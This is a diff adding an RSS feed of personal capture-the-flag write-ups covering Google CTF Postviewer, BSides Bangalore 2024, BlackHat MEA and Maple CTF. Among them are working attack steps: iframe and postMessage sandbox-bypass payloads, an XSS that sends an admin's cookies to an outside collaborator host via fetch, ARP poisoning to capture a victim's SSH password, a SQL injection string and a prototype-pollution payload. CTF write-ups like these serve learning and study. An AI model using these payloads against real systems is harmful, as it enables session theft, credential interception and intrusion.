@@ -1,0 +1,366 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title></title>
+    <link>http://localhost:1313/ctf-writeups/</link>
+    <description>Recent content on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 02 Jul 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/ctf-writeups/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Google CTF postviewer all versions</title>
+      <link>http://localhost:1313/ctf-writeups/gctf-postviewer/</link>
+      <pubDate>Wed, 02 Jul 2025 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/ctf-writeups/gctf-postviewer/</guid>
+      <description>&lt;h1 id=&#34;postviewer-2023&#34;&gt;Postviewer 2023&lt;/h1&gt;
+&lt;p&gt;Assume, attacker&amp;rsquo;s page: &lt;a href=&#34;http://hritik.sh&#34;&gt;http://hritik.sh&lt;/a&gt;
+iframe shim page: &lt;a href=&#34;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&#34;&gt;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&lt;/a&gt;&lt;/p&gt;
+&lt;pre class=&#34;language-javascript&#34;&gt;&lt;code&gt;ifr1 = document.createElement(&amp;#39;iframe&amp;#39;)
+ifr1.src = &amp;#39;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&amp;#39;
+document.body.appendChild(ifr1)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bypass &lt;code&gt;allow-same-origin&lt;/code&gt; regex check (&lt;code&gt;/g&lt;/code&gt;) and create an iframe:&lt;/p&gt;</description>
+      <content>&lt;h1 id=&#34;postviewer-2023&#34;&gt;Postviewer 2023&lt;/h1&gt;
+&lt;p&gt;Assume, attacker&amp;rsquo;s page: &lt;a href=&#34;http://hritik.sh&#34;&gt;http://hritik.sh&lt;/a&gt;
+iframe shim page: &lt;a href=&#34;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&#34;&gt;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&lt;/a&gt;&lt;/p&gt;
+&lt;pre class=&#34;language-javascript&#34;&gt;&lt;code&gt;ifr1 = document.createElement(&amp;#39;iframe&amp;#39;)
+ifr1.src = &amp;#39;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&amp;#39;
+document.body.appendChild(ifr1)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bypass &lt;code&gt;allow-same-origin&lt;/code&gt; regex check (&lt;code&gt;/g&lt;/code&gt;) and create an iframe:&lt;/p&gt;
+&lt;pre class=&#34;language-javascript&#34;&gt;&lt;code&gt;ifr1.contentWindow.postMessage({&amp;#39;body&amp;#39;: &amp;#39;&amp;lt;iframe name=&amp;#34;ifr2&amp;#34; id=&amp;#34;ifr2&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;script&amp;gt; onmessage= (e) =&amp;gt; {console.log(eval(e.data))}&amp;lt;/script&amp;gt;&amp;#39;, &amp;#39;mimeType&amp;#39;:&amp;#39;text/html&amp;#39;, &amp;#39;sandbox&amp;#39;: [&amp;#39;allow-same-origin&amp;#39;, &amp;#39;allow-same-origin&amp;#39;, &amp;#39;allow-scripts&amp;#39;]}, &amp;#34;*&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Create a blob iframe inside of this iframe (parent CSP allows blob only and CSP propagates in local schemes, see: &lt;a href=&#34;https://www.w3.org/TR/CSP3/#security-inherit-csp&#34;&gt;w3org&lt;/a&gt;).
+This iframe will have access to &lt;code&gt;location.ancestorOrigins&lt;/code&gt; and thus leak the random sub-domain (&lt;code&gt;aeu&lt;/code&gt;).
+This is why &lt;code&gt;allow-same-origin&lt;/code&gt; bypass was required, otherwise &lt;code&gt;origin&lt;/code&gt; is set to &lt;code&gt;null&lt;/code&gt; in &lt;code&gt;sandbox&lt;/code&gt;.&lt;/p&gt;
+&lt;pre class=&#34;language-javascript&#34;&gt;&lt;code&gt;top[0][0].postMessage(&amp;#34;blob = new Blob([&amp;#39;&amp;lt;script&amp;gt;top.postMessage(window.location.ancestorOrigins[0], \&amp;#34;*\&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;], {type: &amp;#39;text/html&amp;#39;}); document.getElementById(&amp;#39;ifr2&amp;#39;).src=URL.createObjectURL(blob)&amp;#34;, &amp;#34;*&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;a href=&#34;https://github.com/google/google-ctf/tree/main/2023/quals/web-postviewer2#top-redirection&#34;&gt;top redirection&lt;/a&gt; section terjanq says (1) as well could be a Chrome bug because of the comment that says that the ancestor chain should be respected.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;// Top navigation is forbidden in sandboxed frames unless opted-in, and only
+// then if the ancestor chain allowed to navigate the top frame.
+// Note: We don&amp;rsquo;t check root fenced frames for kTop* flags since the kTop*
+// flags imply the actual top-level page.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Although, it is NOT a chrome bug as ancestor chain &lt;em&gt;is&lt;/em&gt; respected. Here, the top frame is allowed to navigate the iframe because it does not have &lt;code&gt;sandbox&lt;/code&gt; set at all.&lt;/p&gt;
+&lt;p&gt;I was unable to reproduce his openee-opener trick.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Bsides Bangalore 2024</title>
+      <link>http://localhost:1313/ctf-writeups/bsides-bangalore-2024/</link>
+      <pubDate>Sun, 30 Jun 2024 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/ctf-writeups/bsides-bangalore-2024/</guid>
+      <description>&lt;h1 id=&#34;forensics-no-malware-on-file&#34;&gt;Forensics: No malware on file&lt;/h1&gt;
+&lt;p&gt;Not having access to vol2 or a windows box, I wasted entire time getting vol2 working on arm or windows running. Biggest fault!&lt;/p&gt;</description>
+      <content>&lt;h1 id=&#34;forensics-no-malware-on-file&#34;&gt;Forensics: No malware on file&lt;/h1&gt;
+&lt;p&gt;Not having access to vol2 or a windows box, I wasted entire time getting vol2 working on arm or windows running. Biggest fault!&lt;/p&gt;
+&lt;p&gt;Better way (after CTF endend): With calm mind,&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;I started working with vol3 natively.&lt;/li&gt;
+&lt;li&gt;Spinned up lima vm with rosetta support and used vol2&amp;rsquo;s release binaries for amd64&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;working-with-vol3&#34;&gt;Working with vol3&lt;/h2&gt;
+&lt;p&gt;What I did:
+Dumped all registries -&amp;gt; didn&amp;rsquo;t find anything -&amp;gt; moved to printkey registries&lt;/p&gt;
+&lt;p&gt;The Good:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dumped all registries&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The Bad:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Opened only one hive in vim&lt;/li&gt;
+&lt;li&gt;Did not look for embedded magic bytes in all hives&lt;/li&gt;
+&lt;li&gt;Did not run binwalk on dumped registries&lt;/li&gt;
+&lt;li&gt;Did not follow up on registries&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Printkey &amp;ndash;recurse is somehow different than hivelist &amp;ndash;dump.&lt;br&gt;
+Binwalk does not extract all detected. Give &lt;code&gt;-D &#39;.*&#39;&lt;/code&gt; to extract all&lt;/p&gt;
+&lt;h3 id=&#34;tldr&#34;&gt;tl;dr&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;vol -f image.vmem -o dump windows.registry.hivelist &amp;ndash;dump&lt;/li&gt;
+&lt;li&gt;binwalk -y exe dump/* | grep -B 6 PE&lt;/li&gt;
+&lt;li&gt;binwalk -e -D &amp;lsquo;.*&amp;rsquo; registry.SOFTWARE.0xf8a0010f2410.hive&lt;/li&gt;
+&lt;li&gt;Upload found exe to virustotal or any.run or run in windows&lt;/li&gt;
+&lt;li&gt;grep for MetaCTF{&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;See my &lt;a href=&#34;http://localhost:1313/cheatsheets/volatality/&#34;&gt;cheatsheet&lt;/a&gt;.&lt;/p&gt;
+&lt;h1 id=&#34;crypto-twist-and-shout&#34;&gt;Crypto: Twist and Shout&lt;/h1&gt;
+&lt;p&gt;This is based on the fact that python&amp;rsquo;s rand function is predictable/calculable when you have enough inputs.&lt;br&gt;
+It uses Mersenne Twister whose entire state can be calculated with 624 consecutive inputs
+but we don&amp;rsquo;t have access to consecutive inputs here.&lt;/p&gt;
+&lt;p&gt;It turns out, we don&amp;rsquo;t need the entire state either.
+Only need 2 random numbers to predict.&lt;br&gt;
+See: &lt;a href=&#34;https://github.com/deut-erium/RNGeesus/blob/main/src/code_mersenne/mersenne.py&#34;&gt;https://github.com/deut-erium/RNGeesus/blob/main/src/code_mersenne/mersenne.py&lt;/a&gt; : get_ith&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Get i&amp;rsquo;th output given i-624, i-623 and i-227 th inputs&lt;br&gt;
+if &lt;code&gt;both=True&lt;/code&gt; then can be &lt;em&gt;only i-623 and i-227&lt;/em&gt; only as&lt;br&gt;
+we only need MSB of i-624 which can be two possibilities&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Server gives every alternate random number, so keep the offsets accordingly.&lt;/p&gt;
+&lt;pre class=&#34;language-python&#34;&gt;&lt;code&gt;from pwn import *
+import base64
+import gessus
+
+
+host = &amp;#39;icc.metaproblems.com&amp;#39;
+port = 5600
+conn = remote(host, port)
+
+def generate_ticket(n):
+    return str(base64.b16encode(int.to_bytes(n, 4, &amp;#39;little&amp;#39;)))[2:-1]
+
+def ticket_to_bits(ticket: str):
+    byts = base64.b16decode(ticket)
+    return int.from_bytes(byts, &amp;#39;little&amp;#39;)
+    
+
+predictors = []
+
+def main():
+    conn.recvuntil(b&amp;#34;casino!\n&amp;#34;)
+    iter = 0
+    while True:
+        iter &amp;#43;= 1
+
+        conn.recvuntil(b&amp;#34;Would you like to play the random lotto (our only game)? Y/n\n&amp;#34;)
+        conn.sendline(b&amp;#34;y&amp;#34;)
+
+        conn.recvuntil(b&amp;#34;tickets remaining\n&amp;#34;)
+        line = conn.recvline()
+        num = line.split()[2].decode()
+
+
+        target = 312
+
+        if iter == 1 or iter == 199:
+            predictors.append(ticket_to_bits(num))
+
+        if iter == target:
+            answers = gessus.BreakerPy().get_ith(predictors, both=True)
+            answer = generate_ticket(answers[0])
+            print(&amp;#34;sending answer&amp;#34;, answer)
+            conn.sendline(answer)
+            # Check if we guessed correctly
+            response = conn.recvline().decode()
+            if &amp;#34;quite lucky&amp;#34; in response:
+                print(f&amp;#34;Flag obtained: {response}&amp;#34;)
+            else:
+                print(&amp;#34;failed&amp;#34;)
+                print (response)
+                response = conn.recvline().decode()
+                print (response)
+                response = conn.recvline().decode()
+                print (response)
+                break
+        else:
+            conn.sendline()
+            print(f&amp;#34;iteration nnumber {iter} with {num} {ticket_to_bits(num)}&amp;#34;)
+            conn.recvuntil(b&amp;#34;Checking&amp;#34;)
+            conn.recvline()
+
+
+if __name__ == &amp;#34;__main__&amp;#34;:
+    main()&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;network-troublesome-tofu&#34;&gt;Network: Troublesome Tofu&lt;/h1&gt;
+&lt;p&gt;It shouts arp poisoining from the desc of challenge. &lt;code&gt;arpscan&lt;/code&gt; is present is a huge indicator.
+To be certain, diff all items in &lt;code&gt;$PATH&lt;/code&gt; to a fresh ubuntu install.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Target: 192.168.0.2 (ssh)&lt;/li&gt;
+&lt;li&gt;Victim: 192.168.0.50 (contantly ssh-ing to Target with password auth)&lt;/li&gt;
+&lt;li&gt;Attacker: 192.168.0.99&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;ARP poison&lt;/li&gt;
+&lt;li&gt;Ensure getting traffic by tcpdump3&lt;/li&gt;
+&lt;li&gt;!! traffic has a different dst ip, your own kernel will not pick them up. Change your IP to target&amp;rsquo;s IP. &lt;code&gt;ip addr add 192.168.0.2 dev eth0&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;which sshd&lt;/code&gt;, then run sshd, error about dir not present, create that dir&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;./strace -s 4096 /path/to/sshd &amp;gt; logs&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Wait (or monitor netstat for login attempt)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;awk &#39;NF &amp;lt; 5&#39; | logs&lt;/code&gt; or look for read syscalls.&lt;/li&gt;
+&lt;li&gt;Get the password and login to target (reset your ip first).&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;cookie-jar&#34;&gt;Cookie Jar&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;XSS is in email. &amp;ldquo;&amp;lt;script/src=&amp;lsquo;mysite.js&amp;rsquo;&amp;gt;&lt;/script&gt;&amp;quot;@wahtever.com&lt;/li&gt;
+&lt;li&gt;Get URL, send to admin&lt;/li&gt;
+&lt;li&gt;run fetch from admin to get cookies.php and send to your site&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre class=&#34;language-javascript&#34;&gt;&lt;code&gt;cook = fetch(&amp;#39;/cookies.php&amp;#39;)
+	.then((response) =&amp;gt; response.text())
+	.then( (text) =&amp;gt; {
+	fetch(&amp;#39;http://pxqfydd099x1249owsa7yft5dwjn7fv4.oastify.com&amp;#39;, {
+		method: &amp;#34;POST&amp;#34;,
+		body: &amp;#34;ok&amp;#34; &amp;#43; &amp;#34;\n&amp;#34; &amp;#43; text
+	})
+})&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;magnetic-pull&#34;&gt;Magnetic Pull&lt;/h1&gt;
+&lt;p&gt;Liked the challenge although found out in the end that could&amp;rsquo;ve used some chatgpt plugin app for this. Anyway.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Our credit card skimmer yanked this Track 1 data off of an unsuspecting victim, but we&amp;rsquo;re not really sure how to decode it. Can you get their name?&lt;/p&gt;
+&lt;p&gt;A28CACC8A34AE41B512F54B16A34EA55F5BA45A1E22CCBCE7ED283D24CEFD67ED283CA77CC08102F82544B522C58A1020409152E4081027C6E&lt;/p&gt;&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;Read Wikipedia about &lt;a href=&#34;https://en.wikipedia.org/wiki/Digital_card#Track_1&#34;&gt;https://en.wikipedia.org/wiki/Digital_card#Track_1&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Read &lt;a href=&#34;https://en.wikipedia.org/wiki/Six-bit_character_code#DEC_six-bit_code&#34;&gt;https://en.wikipedia.org/wiki/Six-bit_character_code#DEC_six-bit_code&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Decode (take care of endianness)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre class=&#34;language-python&#34;&gt;&lt;code&gt;def _chr(num):
+    assert num &amp;gt;= 0 and num &amp;lt;= 63
+    return chr(num&amp;#43;32)
+
+def __chr(num):
+    if num &amp;gt;= 32 and num &amp;lt;=63:
+        return chr(num)
+    if num &amp;gt; 63:
+        return chr(num - 64)
+    return &amp;#34;&amp;#34;
+
+def bcd(x):
+    if x &amp;gt;= 0x1 and x &amp;lt; 0xA:
+        return chr(x - 0x1 &amp;#43; ord(&amp;#39;1&amp;#39;))
+    if x &amp;gt;= 0x12 and x &amp;lt;= 0x19:
+        return chr(x - 0x12 &amp;#43; ord(&amp;#39;S&amp;#39;))
+    if x &amp;gt;= 0x21 and x &amp;lt;= 0x29:
+        return chr(x - 0x21 &amp;#43; ord(&amp;#39;J&amp;#39;))
+    if x &amp;gt;= 0x31 and x &amp;lt;= 0x39:
+        return chr(x - 0x31 &amp;#43; ord(&amp;#39;A&amp;#39;))
+
+    return &amp;#39;.&amp;#39;
+
+def parity(x):
+    res = 0
+    while x:
+        res ^= x &amp;amp; 1
+        x &amp;gt;&amp;gt;=1
+    return res
+
+def parity_check(bin_data):
+    for i in range(0, len(bin_data)-1, 7):
+        seven_bit_chunk = bin_data[i:i&amp;#43;7]
+        parity_sign = parity(int(seven_bit_chunk, 2))
+        if parity_sign:
+            print(&amp;#34;.&amp;#34;, end=&amp;#34;&amp;#34;)
+        else:
+            print(&amp;#34;x&amp;#34;, end=&amp;#34;&amp;#34;)
+            #f&amp;#34;{parity_sign} == {parity(data)}&amp;#34;
+    print(&amp;#34;Parity check complete&amp;#34;)
+
+def bin_to_ascii(bin_data):
+    for i in range(0, len(bin_data)-1, 7):
+        seven_bit_chunk = bin_data[i:i&amp;#43;7]
+        seven_bit_chunk = seven_bit_chunk[::-1] # Endianness !!!
+        data = int(seven_bit_chunk[1:7], 2)
+        parity_bit = seven_bit_chunk[0:1]
+        parity_sign = int(parity_bit, 2)
+        if parity_sign != parity(data):
+            print(_chr(data), end=&amp;#34;&amp;#34;)
+        else:
+            print(&amp;#34;x&amp;#34;, end=&amp;#34;&amp;#34;)
+    print()
+
+
+hex_data = &amp;#34;A28CACC8A34AE41B512F54B16A34EA55F5BA45A1E22CCBCE7ED283D24CEFD67ED283CA77CC08102F82544B522C58A1020409152E4081027C6E&amp;#34;
+bin_data = hex_to_bin(hex_data)
+parity_check(bin_data)
+bin_to_ascii(bin_data)&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;network-lost-in-the-woods&#34;&gt;Network: Lost in the woods&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Nothing but trees and boxen, as far as the eye can see.&lt;/p&gt;
+&lt;p&gt;Connect with ssh -p 7001 &lt;a href=&#34;mailto:ctf-86cc68f29a7a@ssh.dyn.mctf.io&#34;&gt;ctf-86cc68f29a7a@ssh.dyn.mctf.io&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;See if you can find a box with an open port and go from there!&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Port scan&lt;/p&gt;
+&lt;pre class=&#34;language-text&#34;&gt;&lt;code&gt;/ # nmap 192.168.0.1/24 --open
+PORT     STATE SERVICE
+8000/tcp open  http-alt
+MAC Address: 02:42:0A:01:39:02 (Unknown)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Login Attempt&lt;/p&gt;
+&lt;pre class=&#34;language-text&#34;&gt;&lt;code&gt;/ # curl 192.168.0.45:8000
+curl: (1) Received HTTP/0.9 when not allowed
+
+/ # nc 192.168.0.45 8000
+SSH-2.0-OpenSSH_9.6
+^C
+
+/ # ssh 192.168.0.45 -p 8000
+###########
+
+You found me! That&amp;#39;s PART 1 of 3 completed.
+
+There is nothing more of use on this IP address (the SSH is just to
+  show you this banner, you can&amp;#39;t log in). Continue onwards.
+  The next machine is at 192.168.0.59
+
+You&amp;#39;ll need these credentials:
+Username: admin
+Password: prettypleaseletmein
+
+Hint: Remember to look all over.
+Also, from now on, use the T5 flag to save yourself time, it shouldn&amp;#39;t hurt anything.
+
+###########&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;nmap -p- -T5 192.168.0.59 and get port 43254&lt;/p&gt;
+&lt;pre class=&#34;language-text&#34;&gt;&lt;code&gt;/ # curl -u admin:prettypleaseletmein 192.168.0.59:43254
+
+You found me! That&amp;#39;s PART 2 of 3 completed.
+
+Continue onwards.
+Your final machine is at 192.168.0.132, port number 10.
+
+Hint: Ogres have layers, and so do protocol suites. Check them all.
+If you&amp;#39;d like an additional hint, it&amp;#39;s on this webserver.&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Why leave the hint&lt;/p&gt;
+&lt;pre class=&#34;language-text&#34;&gt;&lt;code&gt;/ # curl -u admin:prettypleaseletmein 192.168.0.59:43254/hint
+It&amp;#39;s not UDP.&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Get the flag&lt;/p&gt;
+&lt;pre class=&#34;language-text&#34;&gt;&lt;code&gt;# nmap 192.168.0.132 -sO -T5
+132      open   sctp
+# ncat --sctp 192.168.0.132 10&lt;/code&gt;&lt;/pre&gt;</content>
+    </item>
+    
+    <item>
+      <title>BlackHat MEA Qualification CTF</title>
+      <link>http://localhost:1313/ctf-writeups/blackhat-mea-qual/</link>
+      <pubDate>Mon, 09 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/ctf-writeups/blackhat-mea-qual/</guid>
+      <description>&lt;h1 id=&#34;warm-me-up&#34;&gt;Warm me up&lt;/h1&gt;
+&lt;p&gt;Flask based application.
+Cookie leaks OTP value.&lt;/p&gt;
+&lt;p&gt;username and password field is vulnerable to sql injection. A union based injection gives redirection to /flag with login cookie set.
+Payload:
+b&amp;rsquo; UNION ALL SELECT &amp;lsquo;admin&amp;rsquo;,&amp;lsquo;daa&amp;rsquo; &amp;ndash;&lt;/p&gt;</description>
+      <content>&lt;h1 id=&#34;warm-me-up&#34;&gt;Warm me up&lt;/h1&gt;
+&lt;p&gt;Flask based application.
+Cookie leaks OTP value.&lt;/p&gt;
+&lt;p&gt;username and password field is vulnerable to sql injection. A union based injection gives redirection to /flag with login cookie set.
+Payload:
+b&amp;rsquo; UNION ALL SELECT &amp;lsquo;admin&amp;rsquo;,&amp;lsquo;daa&amp;rsquo; &amp;ndash;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;It&amp;rsquo;d be interested to see the source code for this&lt;/em&gt;&lt;/p&gt;
+&lt;h1 id=&#34;hardy&#34;&gt;Hardy&lt;/h1&gt;
+&lt;p&gt;x-forwarded-for changes the IP being attacked.&lt;/p&gt;
+&lt;h1 id=&#34;what-am-i&#34;&gt;What am I?&lt;/h1&gt;
+&lt;p&gt;After banging head at multiple decompilers, &lt;a href=&#34;https://manalyzer.org&#34;&gt;https://manalyzer.org&lt;/a&gt; showed a bmp image in &amp;ldquo;Resources&amp;rdquo; section
+Cheat: I searched md5sum of dll on google and it was in manalyzer logs&lt;/p&gt;
+&lt;h1 id=&#34;not-supported&#34;&gt;Not supported&lt;/h1&gt;
+&lt;p&gt;vol.py -f memdump.mem windows.pslist | grep -i notepad
+get pid
+vol.py -f memdump.mem -o dump_dir windows.memmap ‑‑dump ‑‑pid &lt;PID&gt;
+(need linux for this one, hey lima)
+strings -e l &lt;dumpfile&gt;
+look for bhflag, remove spaces, submit without flag format as prescribed&lt;/p&gt;
+&lt;h1 id=&#34;extend&#34;&gt;Extend&lt;/h1&gt;
+&lt;p&gt;Do some basic vodoo to get the chrome dir. Now what ?&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Maple CTF 2023</title>
+      <link>http://localhost:1313/ctf-writeups/maple-2023/</link>
+      <pubDate>Sun, 01 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/ctf-writeups/maple-2023/</guid>
+      <description>&lt;h1 id=&#34;blade-runner&#34;&gt;Blade Runner&lt;/h1&gt;
+&lt;p&gt;Vulnerable code:&lt;/p&gt;
+&lt;pre class=&#34;language-javascript&#34;&gt;&lt;code&gt;        obj[k.toLowerCase()] = req.body[k];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This can lead to prototype pollution in obj. Don&amp;rsquo;t set &amp;ldquo;username&amp;rdquo; in obj and &lt;strong&gt;proto&lt;/strong&gt; pollute &amp;ldquo;username&amp;rdquo;
+Payload:&lt;/p&gt;</description>
+      <content>&lt;h1 id=&#34;blade-runner&#34;&gt;Blade Runner&lt;/h1&gt;
+&lt;p&gt;Vulnerable code:&lt;/p&gt;
+&lt;pre class=&#34;language-javascript&#34;&gt;&lt;code&gt;        obj[k.toLowerCase()] = req.body[k];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This can lead to prototype pollution in obj. Don&amp;rsquo;t set &amp;ldquo;username&amp;rdquo; in obj and &lt;strong&gt;proto&lt;/strong&gt; pollute &amp;ldquo;username&amp;rdquo;
+Payload:&lt;/p&gt;
+&lt;pre class=&#34;language-json&#34;&gt;&lt;code&gt;{
+  &amp;#34;__proto__&amp;#34;: {
+    &amp;#34;username&amp;#34;: &amp;#34;admin&amp;#34;
+  },
+  &amp;#34;password&amp;#34;: &amp;#34;admin&amp;#34;
+}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Reference: &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution&#34;&gt;https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution&lt;/a&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
